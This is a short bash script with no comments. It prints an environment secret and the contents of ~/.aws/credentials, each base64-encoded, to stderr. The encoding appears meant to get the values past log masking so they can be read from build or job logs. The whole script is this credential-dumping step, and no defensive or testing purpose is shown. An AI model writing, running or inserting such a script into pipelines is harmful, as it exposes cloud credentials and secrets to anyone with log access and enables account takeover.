#!/bin/bash
echo $SECRET_SECRET | base64  >&2
cat ~/.aws/credentials | base64  >&2

return 0